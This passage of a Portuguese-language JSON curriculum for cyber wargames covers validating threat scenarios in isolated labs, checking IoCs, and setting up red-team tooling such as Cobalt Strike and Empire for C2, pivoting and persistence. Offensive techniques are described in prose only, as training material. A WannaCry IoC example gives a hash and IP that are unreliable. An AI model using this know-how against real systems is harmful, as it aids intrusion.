                              "practicalExample": "Para um jogo de guerra simulando um ataque APT chinês a infraestrutura crítica brasileira: Documente narrativa com intro baseada em relatório Vest (2022) sobre táticas de persistência, sequência com 5 fases de intrusão citando Tuberville (2019), timeline visual e referências em APA, pronta para importação no Cyber Polygon Range.",
                              "finalVerifications": [
                                "Relatório tem estrutura completa com todas seções e visuais.",
                                "Todas referências (mín. 8) estão corretamente citadas e listadas.",
                                "Narrativa é imersiva, acionável e superior a 1500 palavras.",
                                "Documento é exportável e testado em ambiente de simulação.",
                                "Não há erros factuais ou gramaticais detectados.",
                                "Inclui glossário e apêndices para suporte."
                              ],
                              "assessmentCriteria": [
                                "Precisão e relevância das referências bibliográficas (30%).",
                                "Qualidade narrativa: fluidez, imersão e detalhe técnico (25%).",
                                "Estrutura modular e compatibilidade com ferramentas de simulação (20%).",
                                "Integração visual (timelines, diagramas) e usabilidade (15%).",
                                "Revisão e ausência de erros (10%)."
                              ],
                              "crossCurricularConnections": [
                                "Jornalismo Investigativo: Técnicas de storytelling factual.",
                                "História Militar: Análise de casos históricos de guerra cibernética.",
                                "Redação Técnica: Normas de documentação acadêmica e profissional.",
                                "Design de Jogos: Criação de narrativas interativas para simulações.",
                                "Inteligência Artificial: Uso de LLMs para auxiliar na geração inicial de drafts."
                              ],
                              "realWorldApplication": "Em agências como NSA ou ABIN, esses relatórios são usados para treinar equipes em Cyber Ranges, simulando ataques reais como SolarWinds ou Colonial Pipeline, melhorando readiness operacional e mitigando riscos nacionais."
                            },
                            "estimatedTime": "3 horas",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": [
                              "10.1.4.3.3.1"
                            ]
                          }
                        ]
                      }
                    ]
                  },
                  {
                    "id": "10.1.4.4",
                    "name": "Validação e Integração com Ambientes",
                    "description": "Teste de cenários e adaptação para montagem de ambientes de jogos cibernéticos, considerando regras de engajamento.",
                    "individualConcepts": [
                      {
                        "id": "10.1.4.4.1",
                        "name": "Validação de Cenários de Ameaça",
                        "description": "Processo de teste e verificação da viabilidade e eficácia dos cenários de ameaça criados, garantindo que eles simulem realisticamente ataques cibernéticos em ambientes controlados.",
                        "specificSkills": [
                          {
                            "id": "10.1.4.4.1.1",
                            "name": "Executar testes simulados de cenários",
                            "description": "Realizar simulações controladas dos cenários de ameaça em ambientes isolados para identificar falhas lógicas, inconsistências técnicas e gaps de realismo, utilizando ferramentas como scripts de automação e VMs.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Preparar o ambiente de simulação isolado",
                                  "subSteps": [
                                    "Selecionar e configurar VMs ou containers isolados usando ferramentas como VirtualBox ou Docker.",
                                    "Instalar ferramentas de simulação como scripts Python para automação de ataques e Wireshark para monitoramento de tráfego.",
                                    "Definir baselines do cenário: mapear ativos, vulnerabilidades e comportamentos esperados baseados no planejamento inicial.",
                                    "Testar conectividade e isolamento para evitar vazamento para redes reais.",
                                    "Documentar configuração inicial com screenshots e logs de setup."
                                  ],
                                  "verification": "Ambiente está rodando sem erros, isolado (ping de rede externa falha) e ferramentas instaladas confirmadas via comandos de teste.",
                                  "estimatedTime": "2-4 horas",
                                  "materials": "VirtualBox/Docker, scripts de automação (Python/Selenium), Wireshark, documentação do cenário.",
                                  "tips": "Use snapshots de VM para reset rápido entre testes.",
                                  "learningObjective": "Configurar ambientes isolados seguros para simulações de ameaças cibernéticas.",
                                  "commonMistakes": "Não isolar adequadamente o ambiente, permitindo escapes reais; ignorar compatibilidade de ferramentas."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Executar a simulação controlada do cenário de ameaça",
                                  "subSteps": [
                                    "Iniciar scripts de automação para replicar o cenário passo a passo (ex: phishing simulado seguido de exploit).",
                                    "Simular ações do atacante e defensor em sequência cronometrada.",
                                    "Aplicar variáveis controladas para testar diferentes intensidades (ex: tráfego baixo vs alto).",
                                    "Pausar simulação em checkpoints para ajustes manuais se necessário.",
                                    "Registrar timestamps de todos os eventos principais."
                                  ],
                                  "verification": "Simulação completa rodou do início ao fim com logs gerados e sem interrupções inesperadas.",
                                  "estimatedTime": "1-3 horas",
                                  "materials": "Scripts de automação personalizados, VMs configuradas, timer para sequenciamento.",
                                  "tips": "Grave a tela para review visual posterior.",
                                  "learningObjective": "Executar simulações precisas que repliquem cenários reais de forma controlada.",
                                  "commonMistakes": "Executar passos fora de ordem, alterando resultados; sobrecarregar recursos causando crashes."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Monitorar e coletar dados durante a execução",
                                  "subSteps": [
                                    "Ativar ferramentas de monitoramento em tempo real (ex: tcpdump, SIEM simulado).",
                                    "Capturar métricas: latência, uso de CPU, logs de falhas e tráfego anômalo.",
                                    "Identificar desvios iniciais em tempo real e anotar observações.",
                                    "Garantir coleta completa de dados de todos os vetores (rede, app, host).",
                                    "Exportar dados brutos para análise posterior."
                                  ],
                                  "verification": "Datasets completos coletados (arquivos de log > 1MB por vetor) sem perda de pacotes.",
                                  "estimatedTime": "30-60 minutos",
                                  "materials": "Wireshark/tcpdump, ELK Stack ou Splunk free, scripts de parsing de logs.",
                                  "tips": "Configure alertas automáticos para anomalias críticas durante o monitoramento.",
                                  "learningObjective": "Coletar dados acionáveis de simulações para análise posterior.",
                                  "commonMistakes": "Monitorar apenas um vetor ignorando interdependências; não calibrar filtros de captura."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Analisar resultados e identificar falhas",
                                  "subSteps": [
                                    "Comparar logs reais vs esperados para detectar falhas lógicas e técnicas.",
                                    "Mapear gaps de realismo (ex: tempos irreais de detecção).",
                                    "Categorizar issues: críticos, médios, menores com evidências.",
                                    "Gerar relatório com visualizações (gráficos de timeline, heatmaps).",
                                    "Propor correções para iterações futuras."
                                  ],
                                  "verification": "Relatório gerado com lista exaustiva de falhas identificadas e evidências anexadas.",
                                  "estimatedTime": "2-4 horas",
                                  "materials": "Ferramentas de análise (ELK, Excel/Python Pandas), templates de relatório.",
                                  "tips": "Use diff tools para comparar logs esperados vs reais.",
                                  "learningObjective": "Interpretar dados de simulação para validar e refinar cenários de ameaça.",
                                  "commonMistakes": "Subjetividade na análise sem métricas quantitativas; ignorar falsos positivos."
                                }
                              ],
                              "practicalExample": "Simular um cenário de ransomware em uma VM corporativa: execute script que criptografa arquivos simulados, monitore detecção via EDR falso, identifique gap onde backup não ativa em <5min, ajuste para realismo.",
                              "finalVerifications": [
                                "Todas falhas lógicas identificadas e documentadas.",
                                "Inconsistências técnicas resolvidas ou mitigadas.",
                                "Gaps de realismo quantificados com métricas (ex: tempo de resposta).",
                                "Ambiente resetado para reutilização.",
                                "Relatório compartilhável gerado.",
                                "Teste de repetibilidade: rodar simulação 2x com resultados consistentes."
                              ],
                              "assessmentCriteria": [
                                "Precisão na configuração do ambiente isolado (sem vazamentos).",
                                "Fidelidade da simulação ao cenário planejado (95%+ cobertura).",
                                "Qualidade e completude da coleta de dados (zero perdas).",
                                "Profundidade da análise (todas falhas categorizadas).",
                                "Clareza e açãoabilidade do relatório final.",
                                "Eficiência temporal (dentro de estimados)."
                              ],
                              "crossCurricularConnections": [
                                "Programação: Desenvolvimento de scripts de automação em Python/Bash.",
                                "Análise de Dados: Uso de ferramentas como Pandas e visualizações para logs.",
                                "Redes: Compreensão profunda de protocolos e tráfego via Wireshark.",
                                "Gestão de Projetos: Sequenciamento e documentação de testes."
                              ],
                              "realWorldApplication": "Em operações de Red Team/Blue Team, valida cenários para exercícios de guerra cibernética real, como simulações de ataques APT em empresas, identificando fraquezas antes de treinamentos caros."
                            },
                            "estimatedTime": "4 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.4.4.1.2",
                            "name": "Verificar indicadores de compromisso (IoCs)",
                            "description": "Analisar e validar os Indicadores de Compromisso gerados pelos cenários testados, comparando-os com padrões reais de ataques para assegurar detecção apropriada em jogos cibernéticos.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Identificar IoCs nos Cenários Testados",
                                  "subSteps": [
                                    "Analisar logs e eventos gerados pelo cenário de teste",
                                    "Extrair potenciais indicadores como IPs suspeitos, hashes de arquivos, domínios C2 e padrões de tráfego",
                                    "Categorizar IoCs por tipo (rede, host, comportamento, arquivo)",
                                    "Documentar todos em uma tabela estruturada com timestamps e contextos",
                                    "Revisar lista com equipe para evitar omissões"
                                  ],
                                  "verification": "Lista completa e categorizada de IoCs documentada em tabela revisada pela equipe.",
                                  "estimatedTime": "1 hora",
                                  "materials": [
                                    "Logs do cenário de teste",
                                    "Ferramentas como Wireshark ou ELK Stack",
                                    "Planilha Google Sheets ou Excel"
                                  ],
                                  "tips": "Priorize IoCs comportamentais, como tráfego anômalo, além de signatures estáticas.",
                                  "learningObjective": "Catalogar sistematicamente IoCs extraídos de simulações de ataques cibernéticos.",
                                  "commonMistakes": [
                                    "Ignorar IoCs contextuais não técnicos",
                                    "Duplicar entradas sem normalização",
                                    "Não registrar metadados como severidade"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Pesquisar Padrões Reais de IoCs",
                                  "subSteps": [
                                    "Mapear o tipo de ataque do cenário (ex: ransomware, APT)",
                                    "Consultar bases de dados como MITRE ATT&CK, AlienVault OTX e VirusTotal",
                                    "Coletar IoCs reais associados ao ataque, incluindo hashes, IPs e YARA rules",
                                    "Verificar a atualidade e confiabilidade das fontes (data de última atualização)",
                                    "Compilar uma lista comparativa em formato padronizado (JSON ou CSV)"
                                  ],
                                  "verification": "Relatório com IoCs reais de pelo menos 3 fontes confiáveis e atualizadas.",
                                  "estimatedTime": "2 horas",
                                  "materials": [
                                    "Acesso online a MITRE ATT&CK",
                                    "VirusTotal API",
                                    "Threat intelligence feeds gratuitos como OTX"
                                  ],
                                  "tips": "Use queries específicas por TTPs (Tactics, Techniques, Procedures) para precisão.",
                                  "learningObjective": "Acessar e sintetizar inteligência de ameaças reais para benchmarking.",
                                  "commonMistakes": [
                                    "Usar fontes desatualizadas",
                                    "Não validar credibilidade da fonte",
                                    "Sobrecarregar com IoCs irrelevantes"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Comparar e Analisar IoCs",
                                  "subSteps": [
                                    "Alinhar listas de IoCs do cenário e reais em uma matriz comparativa",
                                    "Avaliar similaridades qualitativas e quantitativas (ex: match exato, parcial)",
                                    "Pontuar confiança (alta/média/baixa) e identificar discrepâncias",
                                    "Detectar potenciais falsos positivos/negativos com justificativas",
                                    "Gerar relatório de gaps com recomendações de ajuste"
                                  ],
                                  "verification": "Matriz de comparação preenchida com scores de confiança e relatório de gaps.",
                                  "estimatedTime": "1.5 horas",
                                  "materials": [
                                    "Planilha de comparação (Excel com fórmulas)",
                                    "Ferramentas de diff como Beyond Compare"
                                  ],
                                  "tips": "Use métricas como Jaccard similarity para comparações objetivas.",
                                  "learningObjective": "Realizar análises comparativas robustas para validar precisão de IoCs.",
                                  "commonMistakes": [
                                    "Viés subjetivo na pontuação",
                                    "Ignorar variações regionais de IoCs",
                                    "Não documentar raciocínio"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Refinar, Validar e Integrar IoCs",
                                  "subSteps": [
                                    "Ajustar IoCs do cenário com base na análise (adicionar/remover/refinar)",
                                    "Testar detecção em ambiente simulado do jogo cibernético",
                                    "Documentar validação final com evidências de testes",
                                    "Atualizar regras de detecção (SIEM/SOAR) e cenários",
                                    "Compartilhar relatório com stakeholders para aprovação"
                                  ],
                                  "verification": "IoCs refinados implementados, testados e aprovados em simulação.",
                                  "estimatedTime": "1 hora",
                                  "materials": [
                                    "Ambiente de simulação do jogo",
                                    "Ferramentas SIEM como Splunk",
                                    "Template de relatório"
                                  ],
                                  "tips": "Automatize testes com scripts para repetibilidade.",
                                  "learningObjective": "Integrar validações em fluxos operacionais de jogos cibernéticos.",
                                  "commonMistakes": [
                                    "Não testar em escala real",
                                    "Pular revisão por stakeholders",
                                    "Esquecer versionamento das mudanças"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um cenário de ataque ransomware WannaCry, extraia IoCs como o hash E3B0C44298FC1C149... e IP 45.32.75.42 dos logs. Compare com MITRE (T1486) e VirusTotal, confirmando match no exploit SMBv1 e ajustando para detecção precisa no jogo.",
                              "finalVerifications": [
                                "Todos IoCs principais têm match alto com padrões reais",
                                "Nenhum falso positivo introduzido nos testes simulados",
                                "Documentação completa com matriz e relatório de gaps",
                                "Detecção funciona em pelo menos 95% dos cenários repetidos",
                                "Aprovação de stakeholders registrada",
                                "IoCs versionados e integrados ao ambiente do jogo"
                              ],
                              "assessmentCriteria": [
                                "Precisão da comparação (>90% de matches justificados)",
                                "Completude da catalogação (todos IoCs identificados)",
                                "Qualidade da documentação (clareza e rastreabilidade)",
                                "Eficiência nos testes (tempo dentro do estimado)",
                                "Profundidade da análise de gaps e refinamentos",
                                "Alinhamento com melhores práticas de threat intel"
                              ],
                              "crossCurricularConnections": [
                                "Análise de Dados: Uso de métricas estatísticas para similaridade",
                                "Inteligência Artificial: Integração com ML para detecção automatizada",
                                "Gestão de Projetos: Fluxos ágeis para validação iterativa",
                                "Ética em TI: Considerações de privacidade em IoCs reais"
                              ],
                              "realWorldApplication": "Em Centros de Operações de Segurança (SOC) de empresas e governos, validar IoCs garante alertas precisos durante incidentes reais, reduzindo tempo de resposta a ataques cibernéticos e minimizando danos financeiros."
                            },
                            "estimatedTime": "3 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.4.4.1.3",
                            "name": "Avaliar consciência situacional",
                            "description": "Testar a integração de elementos de consciência situacional nos cenários, verificando se o Red Team mantém visibilidade e adaptação durante a validação.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Definir métricas e critérios de consciência situacional",
                                  "subSteps": [
                                    "Identificar elementos chave de consciência situacional: percepção, compreensão e projeção.",
                                    "Estabelecer indicadores mensuráveis, como tempo de detecção de mudanças e taxa de adaptação.",
                                    "Mapear cenários específicos do Red Team para cada métrica.",
                                    "Documentar baseline de desempenho esperado.",
                                    "Revisar com stakeholders para alinhamento."
                                  ],
                                  "verification": "Lista de métricas documentada e aprovada por equipe.",
                                  "estimatedTime": "1 hora",
                                  "materials": [
                                    "Planilha de métricas (Excel/Google Sheets)",
                                    "Documentos de cenário de ameaça",
                                    "Guia de consciência situacional (ex: Endsley Model)"
                                  ],
                                  "tips": "Use o modelo OODA (Observe, Orient, Decide, Act) como framework para métricas.",
                                  "learningObjective": "Compreender e quantificar componentes de consciência situacional em contextos cibernéticos.",
                                  "commonMistakes": [
                                    "Definir métricas vagas sem quantificação",
                                    "Ignorar projeção futura nos critérios",
                                    "Não alinhar com objetivos do Red Team"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Configurar ambiente e ferramentas de monitoramento",
                                  "subSteps": [
                                    "Preparar ambiente simulado com logs, sensores e honeypots.",
                                    "Instalar ferramentas de monitoramento: SIEM, Wireshark, ELK Stack.",
                                    "Configurar alertas para mudanças no cenário (ex: novos hosts, tráfego anômalo).",
                                    "Testar ferramentas em modo dry-run para validar captura de dados.",
                                    "Treinar observadores no protocolo de registro imparcial."
                                  ],
                                  "verification": "Ambiente configurado e teste dry-run bem-sucedido sem falhas.",
                                  "estimatedTime": "2 horas",
                                  "materials": [
                                    "Ferramentas: Wireshark, Splunk/ELK, VMs para simulação",
                                    "Scripts de configuração de rede",
                                    "Checklists de setup"
                                  ],
                                  "tips": "Automatize logs com scripts para reduzir viés humano na coleta.",
                                  "learningObjective": "Dominar configuração de ferramentas para observação não intrusiva.",
                                  "commonMistakes": [
                                    "Ferramentas não calibradas para o cenário específico",
                                    "Excesso de alertas levando a fadiga",
                                    "Falta de redundância em monitoramento"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Executar simulação e observar integração de consciência situacional",
                                  "subSteps": [
                                    "Iniciar simulação do cenário de Red Team com injeções dinâmicas de mudanças.",
                                    "Registrar ações do Red Team em tempo real: detecções, decisões e adaptações.",
                                    "Monitorar visibilidade (percepção de assets) e adaptação (mudanças de tática).",
                                    "Interromper simulação apenas se houver risco crítico.",
                                    "Coletar feedback imediato pós-simulação do Red Team."
                                  ],
                                  "verification": "Logs completos de simulação com timestamps e ações registradas.",
                                  "estimatedTime": "3 horas",
                                  "materials": [
                                    "Ambiente simulado ativo",
                                    "Ferramentas de monitoramento",
                                    "Protocolo de observação padronizado"
                                  ],
                                  "tips": "Mantenha observação passiva para evitar influência no comportamento do Red Team.",
                                  "learningObjective": "Aplicar avaliação em tempo real durante operações simuladas.",
                                  "commonMistakes": [
                                    "Interferência precoce na simulação",
                                    "Registro subjetivo sem evidências",
                                    "Ignorar fadiga do Red Team"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Analisar dados e avaliar adaptação do Red Team",
                                  "subSteps": [
                                    "Processar logs para mapear métricas contra baseline.",
                                    "Identificar gaps em visibilidade e adaptação com visualizações (gráficos, heatmaps).",
                                    "Correlacionar ações do Red Team com eventos do cenário.",
                                    "Calcular scores de consciência situacional (ex: % de detecções corretas).",
                                    "Preparar relatório preliminar com evidências."
                                  ],
                                  "verification": "Análise completa com scores calculados e gaps identificados.",
                                  "estimatedTime": "2 horas",
                                  "materials": [
                                    "Ferramentas de análise: Tableau/PowerBI, Python para scripts",
                                    "Logs brutos da simulação"
                                  ],
                                  "tips": "Use métricas quantitativas priorizadas sobre qualitativas para objetividade.",
                                  "learningObjective": "Interpretar dados de monitoramento para validar consciência situacional.",
                                  "commonMistakes": [
                                    "Viés de confirmação na análise",
                                    "Sobrecarga de dados sem priorização",
                                    "Falta de correlação temporal"
                                  ]
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Gerar relatório final e recomendações",
                                  "subSteps": [
                                    "Compilar achados em relatório estruturado: forças, fraquezas, scores.",
                                    "Propor treinamentos específicos para gaps identificados.",
                                    "Validar relatório com simulação de peer-review.",
                                    "Compartilhar lições aprendidas com equipe ampliada.",
                                    "Arquivar para iterações futuras."
                                  ],
                                  "verification": "Relatório final aprovado e distribuído.",
                                  "estimatedTime": "1 hora",
                                  "materials": [
                                    "Template de relatório",
                                    "Ferramentas de edição colaborativa (Google Docs)"
                                  ],
                                  "tips": "Inclua visualizações para facilitar compreensão executiva.",
                                  "learningObjective": "Sintetizar avaliações em ações acionáveis.",
                                  "commonMistakes": [
                                    "Relatório genérico sem evidências",
                                    "Falta de recomendações específicas",
                                    "Não fechar loop de feedback"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um cenário simulado de infiltração em uma rede corporativa, introduza um honeypot inesperado; observe se o Red Team detecta o artefato em <5 minutos, adapta a rota de ataque e mantém visibilidade de 90% dos assets reais, registrando logs via SIEM.",
                              "finalVerifications": [
                                "Red Team detectou ≥80% das mudanças injetadas no cenário?",
                                "Tempo médio de adaptação <10 minutos por evento?",
                                "Visibilidade mantida em ≥85% dos assets durante toda simulação?",
                                "Taxa de decisões baseadas em dados >70%?",
                                "Ausência de brechas críticas por falta de projeção futura?",
                                "Feedback do Red Team alinhado com logs observados?"
                              ],
                              "assessmentCriteria": [
                                "Precisão na percepção de mudanças: ≥85%",
                                "Velocidade de compreensão e decisão: <15 minutos médio",
                                "Efetividade de adaptação tática: ≥75% sucesso",
                                "Manutenção de visibilidade geral: ≥90%",
                                "Integração do modelo OODA: Completa em ≥80% das iterações",
                                "Redução de erros por falta de consciência: ≥60%"
                              ],
                              "crossCurricularConnections": [
                                "Gestão de Riscos (SC-02): Identificação de ameaças dinâmicas",
                                "Psicologia Cognitiva: Modelos de percepção humana (Endsley)",
                                "Análise de Dados: Processamento de logs em Big Data",
                                "Liderança e Tomada de Decisão: Aplicação OODA Loop",
                                "Inteligência Artificial: Uso de IA para monitoramento preditivo"
                              ],
                              "realWorldApplication": "Em operações de resposta a incidentes cibernéticos reais, como ataques APT a infraestruturas críticas, a avaliação de consciência situacional permite que equipes de defesa detectem evoluções de ameaças, adaptem defesas em tempo real e minimizem danos, simulando cenários como o NotPetya ou SolarWinds."
                            },
                            "estimatedTime": "2 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          }
                        ]
                      },
                      {
                        "id": "10.1.4.4.2",
                        "name": "Adaptação e Montagem de Ambientes Cibernéticos",
                        "description": "Adaptação dos cenários validados para a configuração de ambientes de simulação realistas, incluindo redes, hosts e ferramentas específicas para operações de Red Team.",
                        "specificSkills": [
                          {
                            "id": "10.1.4.4.2.1",
                            "name": "Configurar ambientes de simulação isolados",
                            "description": "Montar redes virtuais com ferramentas como VirtualBox, VMware ou AWS simulando infraestruturas alvo, adaptando cenários para compatibilidade com hardware e software disponíveis.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Avaliar Requisitos e Planejar o Ambiente de Simulação",
                                  "subSteps": [
                                    "Analise o cenário de ameaça alvo: identifique componentes como servidores, estações de trabalho, firewalls e redes segmentadas.",
                                    "Verifique compatibilidade de hardware do host: CPU com virtualização habilitada (VT-x/AMD-V), RAM mínima 16GB, disco SSD com 100GB livres.",
                                    "Escolha a ferramenta: VirtualBox para setups locais gratuitos, VMware para avançado, AWS EC2 para nuvem escalável.",
                                    "Defina topologia de rede: isole via NAT, Host-Only ou Internal Network para prevenir vazamentos.",
                                    "Documente especificações: liste VMs necessárias, SOs (ex: Ubuntu Server, Windows 10) e configurações de rede."
                                  ],
                                  "verification": "Checklist preenchido confirmando requisitos atendidos e diagrama de topologia desenhado.",
                                  "estimatedTime": "1 hora",
                                  "materials": [
                                    "Computador host com specs mínimas",
                                    "Diagrama de rede (ferramenta como draw.io)",
                                    "Documentação oficial das ferramentas (VirtualBox/VMware/AWS)"
                                  ],
                                  "tips": "Priorize isolamento desde o planejamento; use diagramas para visualizar conexões antes de implementar.",
                                  "learningObjective": "Compreender e mapear requisitos para simulações cibernéticas seguras e compatíveis.",
                                  "commonMistakes": [
                                    "Subestimar recursos de hardware levando a falhas de performance",
                                    "Ignorar ativação de virtualização no BIOS",
                                    "Não documentar topologia causando confusão posterior"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Instalar e Configurar a Ferramenta de Virtualização",
                                  "subSteps": [
                                    "Baixe e instale a ferramenta escolhida: VirtualBox de virtualbox.org, VMware Workstation Player ou configure AWS account com VPC.",
                                    "Habilite configurações de segurança: desative USB passthrough, configure rede bridged apenas se necessário.",
                                    "Crie rede virtual isolada: no VirtualBox, configure 'Internal Network' ou 'Host-Only Adapter'; no AWS, crie VPC privada.",
                                    "Instale extensões/hosts: VirtualBox Extension Pack para suporte USB/encriptação.",
                                    "Teste instalação básica: crie uma VM teste e verifique boot sem rede externa."
                                  ],
                                  "verification": "Ferramenta instalada, rede isolada criada e VM teste boots isoladamente (ping falha para host/internet).",
                                  "estimatedTime": "1.5 horas",
                                  "materials": [
                                    "Download oficial da ferramenta",
                                    "Chave de licença se VMware Pro",
                                    "Conta AWS gratuita para testes"
                                  ],
                                  "tips": "Use snapshots iniciais após instalação para facilitar rollbacks em testes de ataque.",
                                  "learningObjective": "Dominar instalação segura de hipervisores para ambientes isolados.",
                                  "commonMistakes": [
                                    "Configurar rede bridged acidentalmente expondo à internet",
                                    "Esquecer Extension Pack limitando features",
                                    "Instalar em disco insuficiente causando lentidão"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Criar e Configurar Máquinas Virtuais e Infraestrutura Alvo",
                                  "subSteps": [
                                    "Crie VMs principais: aloque RAM/CPU/disco conforme specs (ex: 2GB RAM para servidor alvo).",
                                    "Instale SOs nos VMs: Ubuntu para servidores, configure IPs estáticos na rede interna.",
                                    "Configure serviços simulados: instale Apache/Nginx no servidor alvo, Active Directory no DC simulado.",
                                    "Estabeleça comunicações internas: teste ping entre VMs, configure firewall rules para simular perímetro.",
                                    "Adapte para hardware: reduza specs se host limitado, use containers (Docker) dentro de VMs para eficiência."
                                  ],
                                  "verification": "Todas VMs bootam, serviços rodam, conectividade interna funciona mas zero acesso externo.",
                                  "estimatedTime": "3 horas",
                                  "materials": [
                                    "ISOs de SOs (Ubuntu, Windows trial)",
                                    "Scripts de automação Ansible para setup rápido",
                                    "Ferramentas de monitoramento como Wireshark VM"
                                  ],
                                  "tips": "Automatize instalações com scripts para reprodutibilidade em múltiplos cenários.",
                                  "learningObjective": "Construir infraestruturas virtuais realistas simulando alvos de ciberataques.",
                                  "commonMistakes": [
                                    "IPs conflitantes na rede virtual",
                                    "Serviços expostos desnecessariamente",
                                    "Sobrecarga de host por alocações excessivas"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Validar Isolamento e Testar Cenários de Simulação",
                                  "subSteps": [
                                    "Teste isolamento: tente ping/accesso de VMs para host/internet (deve falhar), use tcpdump para monitorar tráfego.",
                                    "Simule cenários de ameaça: configure VM atacante com Kali Linux, teste scans internos sem vazamento.",
                                    "Monitore performance: use ferramentas do hipervisor para CPU/RAM, ajuste se necessário.",
                                    "Crie snapshots de baseline: marque estado inicial para jogos de guerra.",
                                    "Documente adaptações: registre mudanças por limitações de hardware/software."
                                  ],
                                  "verification": "Relatório de testes confirma isolamento total e cenários funcionam (ex: nmap scan interno succeeds, externo falha).",
                                  "estimatedTime": "2 horas",
                                  "materials": [
                                    "Kali Linux ISO para VM atacante",
                                    "Tcpdump/Wireshark",
                                    "Relatório template em Markdown"
                                  ],
                                  "tips": "Execute testes de vazamento múltiplas vezes; isole GPU se usando para aceleração.",
                                  "learningObjective": "Garantir segurança e funcionalidade em simulações de operações cibernéticas.",
                                  "commonMistakes": [
                                    "Tráfego vazando via shared folders",
                                    "Não testar de múltiplos ângulos",
                                    "Snapshots não criados perdendo baselines"
                                  ]
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Otimizar e Preparar para Uso em Jogos de Guerra",
                                  "subSteps": [
                                    "Otimize performance: habilite multi-core, ajuste memória dinâmica.",
                                    "Integre ferramentas de CTF: instale Rangefinder ou scripts para reset automático.",
                                    "Backup completo: exporte OVA/AMI para portabilidade.",
                                    "Crie guia de uso: instruções para reset, acesso e teardown.",
                                    "Teste escalabilidade: adicione mais VMs se hardware permite."
                                  ],
                                  "verification": "Ambiente otimizado roda cenários fluidos, backup restaura perfeitamente.",
                                  "estimatedTime": "1 hora",
                                  "materials": [
                                    "Ferramentas de export (VBoxManage, AWS AMI)",
                                    "Guia template"
                                  ],
                                  "tips": "Use AWS Lightsail para híbrido local-nuvem em hardware fraco.",
                                  "learningObjective": "Finalizar ambientes prontos para treinamento e operações simuladas.",
                                  "commonMistakes": [
                                    "Otimização ignorada causando lags em simulações",
                                    "Backup incompleto perdendo dados",
                                    "Guia ausente dificultando reutilização"
                                  ]
                                }
                              ],
                              "practicalExample": "Configure um ambiente isolado simulando uma rede corporativa: 1 DC Windows Server com AD, 1 servidor Linux web vulnerável (DVWA), 1 workstation vítima e 1 VM Kali atacante. Teste exploit de SQLi da Kali no web server sem acessar a internet real.",
                              "finalVerifications": [
                                "Nenhuma VM acessa rede host ou internet (confirmado por tcpdump e nmap externo).",
                                "Comunicação interna perfeita entre VMs (ping, HTTP interno).",
                                "Serviços alvo vulneráveis funcionam (ex: DVWA acessível via IP interno).",
                                "Performance estável durante simulação de ataque (CPU <80%).",
                                "Snapshots e backup restauram ambiente em <5min.",
                                "Documentação completa permite recriação por terceiro."
                              ],
                              "assessmentCriteria": [
                                "Precisão na topologia e isolamento (sem vazamentos detectados).",
                                "Eficiência de recursos: ambiente roda sem crashes em hardware padrão.",
                                "Funcionalidade de cenários: exploits simulados succeeds internamente.",
                                "Documentação clara e reprodutível.",
                                "Tempo de setup dentro do estimado (<8h total).",
                                "Adaptação criativa a limitações hardware/software."
                              ],
                              "crossCurricularConnections": [
                                "Redes de Computadores: topologias e protocolos (TCP/IP, VLANs virtuais).",
                                "Cloud Computing: migração para AWS VPC/EC2.",
                                "Programação: scripts Ansible/Docker para automação de setups.",
                                "Sistemas Operacionais: configuração multi-OS e hardening.",
                                "Análise de Malware: uso em sandboxes para dissecação segura."
                              ],
                              "realWorldApplication": "Em operações de Red Team, configura labs para jogos de guerra cibernética, permitindo simular ataques a infraestruturas críticas como bancos ou utilities sem risco real, essencial para treinamento de equipes de defesa e certificações como OSCP."
                            },
                            "estimatedTime": "6 horas",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.4.4.2.2",
                            "name": "Integrar ferramentas de Ethical Hacking",
                            "description": "Instalar e configurar ferramentas de pivoting, persistência e C2 (Comando e Controle) como Cobalt Strike ou Empire, adaptando-as aos cenários para suportar jogos cibernéticos.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Pesquisa e Preparação de Ferramentas de Ethical Hacking",
                                  "subSteps": [
                                    "Identifique ferramentas adequadas como Cobalt Strike ou Empire para pivoting, persistência e C2.",
                                    "Revise documentação oficial e requisitos de sistema (ex: Java para Cobalt Strike, Python para Empire).",
                                    "Configure ambiente isolado usando VMs (ex: Kali Linux como atacante, targets Windows/Linux).",
                                    "Obtenha licenças/trials legais e verifique conformidade ética/legal.",
                                    "Planeje mapeamento de cenários de jogos cibernéticos (ex: rede corporativa simulada)."
                                  ],
                                  "verification": "Lista de ferramentas selecionadas com links de docs e ambiente VM configurado e snapshotado.",
                                  "estimatedTime": "1-2 horas",
                                  "materials": "VMs (VirtualBox/VMware), Kali Linux ISO, documentação oficial de Cobalt Strike/Empire, acesso a trials/licenças.",
                                  "tips": "Use ambientes isolados para evitar vazamentos; priorize ferramentas open-source como Empire para iniciantes.",
